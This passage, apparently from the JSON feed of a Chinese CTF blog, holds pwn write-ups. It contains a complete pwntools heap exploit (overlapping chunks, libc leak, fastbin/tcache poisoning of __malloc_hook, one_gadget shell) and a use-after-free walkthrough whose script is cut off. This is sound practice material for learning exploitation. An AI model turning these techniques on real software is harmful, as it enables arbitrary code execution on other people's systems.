data-src=\"./image-20231019220812375.png\" alt=\"image-20231019220812375\"><img data-src=\"./image-20231019220839000.png\" alt=\"image-20231019220839000\"></p>\n<p><code>malloc(0)</code>  后是如下情况。<img data-src=\"./image-20231019221621145.png\" alt=\"image-20231019221621145\"></p>\n<p>rdx 也变成 0 了，可以用 0xe3b01 的 one_gadget 了。</p>\n<p>最后记得 malloc (0) 手写，毕竟已经收不到 <code>b&quot;the content:&quot;</code>  了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>isremote <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28449</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    isremote <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b *$rebase(0x1592)')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/glibc-all-in-one/2.31-0ubuntu9.7_amd64/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b malloc')</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your Choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'the content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token keyword\">not</span> <span class=\"token string\">b'forbidden'</span> <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'1.Create Slot'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa60'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x460</span><span class=\"token operator\">//</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\">#4 - 12</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa70'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#13</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x81'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#14-0</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x461</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#15-1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1f</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'b'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#16-1</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ab'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mainarena_96 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mainarena_96 <span class=\"token operator\">-</span> <span class=\"token number\">0x1ecbe0</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the libcbase is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>libcbase<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> isremote <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b31</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>freehook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>   </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mallochook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the freehook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>freehook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the malloc_hook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mallochook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the one_gadget is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>onegadget<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>fakechunk0 <span class=\"token operator\">=</span> mallochook <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span> <span class=\"token operator\">-</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>payload0 <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x3</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>   <span class=\"token comment\">#4-10 7->tcache 0x7</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#18-1</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#fastbin -> 2</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"81\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>fakechunk0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#19-1</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'cc70'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token comment\"># tcache -> 2 -> fake</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'cc'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#from fastbin    #2</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>mal<span class=\"token punctuation\">(</span>payload0<span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "heap",
                "double free",
                "fastbin attack",
                "chunk_extend_and_overlapping",
                "one_gadget",
                "tcache",
                "malloc_hook",
                "free_hook"
            ]
        },
        {
            "id": "http://waltcsz.github.io/PWN/Write-Up/buu-0910-99351e39558a/",
            "url": "http://waltcsz.github.io/PWN/Write-Up/buu-0910-99351e39558a/",
            "title": "buu 0910",
            "date_published": "2023-09-11T09:12:49.000Z",
            "content_html": "<h2 id=\"bjdctf_2020_router\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_router\">#</a> bjdctf_2020_router</h2>\n<p><img data-src=\"./image-20230911171316327.png\" alt=\"image-20230911171316327\"></p>\n<p>0x7ffd797d1e80 - 0x7ffd797d1fc0 = -320</p>\n<p>tcache 中的地址为与堆基址异或后的地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjUxNzA3Nzc=\">从 VNCTF2021-ff 浅析 libc2.32 下 ptmalloc 新增的防护之指针异或加密 - 知乎 (zhihu.com)</span></p>\n<h2 id=\"zjctf-2019-easyheap\"><a class=\"markdownIt-Anchor\" href=\"#zjctf-2019-easyheap\">#</a> zjctf 2019 easyheap</h2>\n<h2 id=\"picoctf_2018_buffer_overflow_1\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_1\">#</a> PicoCTF_2018_buffer_overflow_1</h2>\n<p>setegid</p>\n<p>送分</p>\n<h2 id=\"black-watch-入群题\"><a class=\"markdownIt-Anchor\" href=\"#black-watch-入群题\">#</a> black watch 入群题</h2>\n<h2 id=\"inndy_rop\"><a class=\"markdownIt-Anchor\" href=\"#inndy_rop\">#</a> inndy_rop</h2>\n<p>学了个 ROPgadget 的妙招，–ropchain 参数可以自动生成 rop 链，代码都写好了一半。</p>\n<p>其次，找 32 位 elf 的系统调用时，用–only ‘int’</p>\n<h2 id=\"hitcontraining_uaf\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_uaf\">#</a> hitcontraining_uaf</h2>\n<p>Use after free</p>\n<p>（与 ctfwiki 的 [例题](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8=\">Use After Free - CTF Wiki (ctf-wiki.org)</span>) 一致）</p>\n<p>这道题经典菜单，add，print，delete 三个选项。</p>\n<p>在 add 中，程序会进行两次 malloc，第一次 malloc 一个 8 字节的空间，存放一个打印函数的地址和第二次 malloc 的地址，以下称为头块。第二次 malloc 为实际存放内容的堆块，以下称为真实块。</p>\n<p>在 print 中，利用头块前 4 字节的打印函数的地址将真实块进行输出。</p>\n<p>在 delete 中，free 完没有清空指针，而且 add 中分配的两个堆块均会被释放。</p>\n<p>其次，notelist 上限为 5，释放堆块后不会清指针，因此只允许分配 5 次堆块。</p>\n<p>存在后门函数 magic。</p>\n<p>这题没有编辑函数，虽然有指针可以对释放后的堆块进行输出和再次释放，但不能修改。所以我原先的思路，即利用编辑函数修改 bk 指向头块输出函数地址位置，将堆块分配到其处再修改地址的方案失效。</p>\n<p>因此这题利用关键是每次同时分配和释放的两个堆块。倘若某次申请的内存大小为 8 字节，那么分配的两个堆块大小一样，便会从同一个 bin 中取出，即 0x10 的 bin。而释放时头块进入的即是 0x10 的 bin。这样我们的真实块必然会分配到已经释放的一个头块上，对其写入 magic，调用 print 对对应的堆块输出，即可跳转到后门函数。</p>\n<ul>\n<li>申请 note0，真实块 size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>\n<li>申请 note1，真实块 size 为 16（同上）</li>\n<li>释放 note0</li>\n<li>释放 note1</li>\n<li>此时，0x20 的 fastbin chunk 中链表为 note1-&gt;note0, 0x10 的 fastbin chunk 中链表为 note1_head -&gt; note0_head</li>\n<li>申请 note2，并且设置真实块 content 的大小为 8，那么根据堆的分配规则</li>\n<li>note2_head 其实会分配 note1_head。</li>\n<li>note2 对应的 chunk 其实是 note0_head。</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28447</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./hacknote')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x08048A75')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x08048945</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Note size :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token 